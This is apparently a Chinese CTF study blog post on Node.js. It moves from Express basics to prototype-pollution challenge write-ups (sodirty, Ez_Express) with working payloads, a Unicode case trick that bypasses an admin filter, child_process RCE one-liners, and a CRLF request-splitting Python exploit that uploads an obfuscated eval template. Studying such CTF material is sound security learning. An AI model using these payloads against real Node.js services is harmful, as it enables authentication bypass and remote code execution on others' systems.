---
title: NodeJs相关
date: 2023/5/1 19:48:25
categories:
- CTF

---

## nodejs基础

使用 Node.js 时，我们不仅仅 在实现一个应用，同时还实现了整个 HTTP 服务器。事实上，我们的 Web 应用以及对应的 Web 服务器基本上是一样的。

在我们创建 Node.js 第一个 "Hello, World!" 应用前，让我们先了解下 Node.js 应用是由哪几部分组成的：

1. **引入 required 模块：**我们可以使用 **require** 指令来载入 Node.js 模块。
2. **创建服务器：**服务器可以监听客户端的请求，类似于 Apache 、Nginx 等 HTTP 服务器。
3. **接收请求与响应请求** 服务器很容易创建，客户端可以使用浏览器或终端发送 HTTP 请求，服务器接收请求后返回响应数据。



```js
app.use('static',express.static('public'))
#  访问路由/static/，可以访问到public文件夹下的静态文件
```



#### 引入模块

```js
//require就像import
var http = require("http");
```

#### 创建服务器

```js
var http = require('http');

http.createServer(function (request, response) {

    // 发送 HTTP 头部 
    // HTTP 状态值: 200 : OK
    // 内容类型: text/plain
    response.writeHead(200, {'Content-Type': 'text/plain'});

    // 发送响应数据 "Hello World"
    response.end('Hello World\n');
}).listen(8888);

// 终端打印如下信息
console.log('Server running at http://127.0.0.1:8888/');
```



#### express框架

demo.js

```js
var express = require('express');
var app = express();
 
app.get('/',(req, res) => {
    res.send('test');
  })

var server = app.listen(8081, function () {
 
  var host = server.address().address
  var port = server.address().port
 
  console.log("应用实例，访问地址为 http://%s:%s", host, port)
 
})

const wiki = require('./wiki.js');
// ...
app.use('/wiki', wiki);
```

wiki.js

```js
// wiki.js - 维基路由模块

const express = require('express');
const router = express.Router();

// 主页路由
router.get('/', (req, res) => {
  res.send('维基主页');
});

// "关于页面"路由
router.get('/about', (req, res) => {
  res.send('关于此维基');
});

module.exports = router;
```

**request** 和 **response** 对象的具体介绍：

**Request 对象** - request 对象表示 HTTP 请求，包含了请求查询字符串，参数，内容，HTTP 头部等属性。常见属性有：

1. req.app：当callback为外部文件时，用req.app访问express的实例
2. req.baseUrl：获取路由当前安装的URL路径
3. req.body / req.cookies：获得「请求主体」/ Cookies
4. req.fresh / req.stale：判断请求是否还「新鲜」
5. req.hostname / req.ip：获取主机名和IP地址
6. req.originalUrl：获取原始请求URL
7. req.params：获取路由的parameters
8. req.path：获取请求路径
9. req.protocol：获取协议类型
10. req.query：获取URL的查询参数串
11. req.route：获取当前匹配的路由
12. req.subdomains：获取子域名
13. req.accepts()：检查可接受的请求的文档类型
14. req.acceptsCharsets / req.acceptsEncodings / req.acceptsLanguages：返回指定字符集的第一个可接受字符编码
15. req.get()：获取指定的HTTP请求头
16. req.is()：判断请求头Content-Type的MIME类型

**Response 对象** - response 对象表示 HTTP 响应，即在接收到请求时向客户端发送的 HTTP 响应数据。常见属性有：

1. res.app：同req.app一样
2. res.append()：追加指定HTTP头
3. res.set()在res.append()后将重置之前设置的头
4. res.cookie(name，value [，option])：设置Cookie
5. opition: domain / expires / httpOnly / maxAge / path / secure / signed
6. res.clearCookie()：清除Cookie
7. res.download()：传送指定路径的文件
8. res.get()：返回指定的HTTP头
9. res.json()：传送JSON响应
10. res.jsonp()：传送JSONP响应
11. res.location()：只设置响应的Location HTTP头，不设置状态码或者close response
12. res.redirect()：设置响应的Location HTTP头，并且设置状态码302
13. res.render(view,[locals],callback)：渲染一个view，同时向callback传递渲染后的字符串，如果在渲染过程中有错误发生next(err)将会被自动调用。callback将会被传入一个可能发生的错误以及渲染后的页面，这样就不会自动输出了。
14. res.send()：传送HTTP响应
15. res.sendFile(path [，options] [，fn])：传送指定路径的文件 -会自动根据文件extension设定Content-Type
16. res.set()：设置HTTP头，传入object可以一次设置多个头
17. res.status()：设置HTTP状态码
18. res.type()：设置Content-Type的MIME类型





## 原型链污染

### 前置知识

https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html

![20210127153316-eb9d37a8-6071-1](../images/20210127153316-eb9d37a8-6071-1-1699690923131.png)

> 1. 每个构造函数（js中构造函数即是类）都有一个原型对象(prototype)
>
> 2. 对象的`__proto__`属性，指向类的原型对象`prototype`
>
> 3. JavaScript使用prototype链实现继承机制
>
>
> `类.prototype == 对象.__proto__`
>
> 这两者指向的是同一个对象

![image.png](../images/4b63f1ef-6ed8-4448-9644-f11620822aaf.2b2425c31fdb-1699690926980.png)

![image-20230404170753338](../images/image-20230404170753338-1699690933265.png)



### 漏洞成因

数组（对象）的"键名"能够被操作，能够修改对象的`__proto__`属性。

![image-20230404171519842](../images/image-20230404171519842-1699690937448.png)

![image-20230404171928256](E:\typora img\image-20230404171928256.png)

```js
let o2 = {a: 1, "__proto__": {b: 2}}
```

上述中`__proto__`不是o2的键名，是因为`"__proto__": {b: 2}`实际上是修改了原型对象的属性b,所以o2的键名为a和b。

而在json的解析下，会将`"__proto__"`认为是键名

![image-20230404172016018](../images/image-20230404172016018-1699690943113.png)

常见操作

```js
对象merge
对象clone（其实内核就是将待操作的对象merge到一个空对象中）
set-value
```



### 实例

```js
var express = require('express')
var app = express();

let o1 = {};
o3 = {};
function merge(target, source) {
    for (let key in source) {
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
}

function judge(){
    if(o3.b==2) return "success";
    else return "false";
}

app.get('/',express.json(),(req,res)=>{
    // var id =req.query.id;
    let o2 = JSON.parse(req.query.id)
    merge(o1, o2);
    res.send(judge());
})

var server = app.listen(8081, function () {
 
    var host = server.address().address
    var port = server.address().port
   
    console.log("应用实例，访问地址为 http://%s:%s", host, port)
   
  })
```

![sd](../images/image-20221128214944076-1699690946540.png)

#### sodirty

关键代码

```js
const Admin = {
    "password":process.env.password?process.env.password:"password"
}

router.post("/getflag", function (req, res, next) {
    if (req.body.password === undefined || req.body.password === req.session.challenger.password){
        res.send("登录失败");
    }else{
        if(req.session.challenger.age > 79){
            res.send("糟老头子坏滴很");
        }
        let key = req.body.key.toString();
        let password = req.body.password.toString();
        if(Admin[key] === password){
            res.send(process.env.flag ? process.env.flag : "flag{test}");
        }else {
            res.send("密码错误，请使用管理员用户名登录.");
        }
    }

});

if (req.body.attrkey === undefined || req.body.attrval === undefined) {
            res.send("传参有误");
        }else {
            let key = req.body.attrkey.toString();
            let value = req.body.attrval.toString();
            setFn(req.session.challenger, key, value);
            res.send("修改成功");
        }
```

需要让下面代码成立

```js
Admin[key] === req.session.challenger.password
```

`req.session.challenger`的键名是可控的，所以只需要污染`req`的原型对象属性值就可以污染`Admin`

payload

```js
# 使得原型对象具有pwd属性值
attrkey=__proto__.pwd&value=18 # /update

# 因为Admin对象没有pwd属性，就会从原型对象寻找
key=pwd&password=18 # /getflag
```

#### Ez_Express

##### 漏洞点

存在原型链污染（`clone`）和ssti（`render`）

```js
router.post('/action', function (req, res) {
  if(req.session.user.user!="ADMIN"){res.end("<script>alert('ADMIN is asked');history.go(-1);</script>")} 
  req.session.user.data = clone(req.body);
  res.end("<script>alert('success');history.go(-1);</script>");  
});
```

```js

const clone = (a) => {
  return merge({}, a);
}

const merge = (a, b) => {
  for (var attr in b) {
    if (isObject(a[attr]) && isObject(b[attr])) {
      merge(a[attr], b[attr]);
    } else {
      a[attr] = b[attr];
    }
  }
  return a
}

```

```js
router.get('/info', function (req, res) {
  res.render('index',data={'user':res.outputFunctionName});
})
```

需要先绕过**ADMIN登录**

```js
if(safeKeyword(req.body.userid)){
    res.end("<script>alert('forbid word');history.go(-1);</script>") 
   }
    req.session.user={
      'user':req.body.userid.toUpperCase(),
      'passwd': req.body.pwd,
      'isLogin':false
    }
    res.redirect('/');
    
    
function safeKeyword(keyword) {
  if(keyword.match(/(admin)/is)) {
      return keyword
  }

  return undefined
}
```

[Fuzz中的javascript大小写特性 | 离别歌](https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html)

```
"ı".toUpperCase() == 'I'
"ſ".toUpperCase() == 'S'

"K".toLowerCase() == 'k'
```

![image-20230404211326910](../images/image-20230404211326910-1699690994641.png)



RCE

```js
global.process.mainModule.constructor._load(‘child_process’).exec('command')

require( "child_process" ).spawnSync( 'command', ['arg'] ).stdout.toString()

require( "child_process" ).spawnSync( 'command', ['arg'] ).stdout.toString()

require("child_process").execSync('command')

require("child_process").execSync('command')
```





## CRLF

[NodeJS 中 Unicode 字符损坏导致的 HTTP 拆分攻击-安全客 - 安全资讯平台](https://www.anquanke.com/post/id/241429#h2-6)

```python
import urllib.parse
import requests

payload = ''' HTTP/1.1

POST /file_upload HTTP/1.1
Host: 127.0.0.1:8081
Content-Length: 298
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: 127.0.0.1:8081
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjgcOqgAmbNWkjnvS
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: 127.0.0.1:8081/?action=upload
Accept-Encoding: gzip, deflate
Accept-Language: zh,zh-CN;q=0.9
Connection: close

------WebKitFormBoundaryjgcOqgAmbNWkjnvS
Content-Disposition: form-data; name="file"; filename="1.pug"
Content-Type: ../template

var x = eval("glob"+"al.proce"+"ss.mainMo"+"dule.re"+"quire('child_'+'pro'+'cess')['ex'+'ecSync']('ls /').toString()")
------WebKitFormBoundaryjgcOqgAmbNWkjnvS--


GET / HTTP/1.1
test:'''.replace("\n", "\r\n")

def payload_encode(raw):
    ret = u""
    for i in raw:
        ret += chr(0x0100+ord(i))
    return ret

payload = payload_encode(payload)

pro = {'http': 'http://127.0.0.1:8011',
'https': 'http://127.0.0.1:8011'
}

r = requests.get('http://77cb6778-efc8-49b4-9567-fdf189136b3a.node4.buuoj.cn:81/core?q=' + urllib.parse.quote(payload),proxies=pro, verify=False)

```

中间部分是伪造的请求，需要注意content-length，直接放在burp中发包，burp会自动更新content-length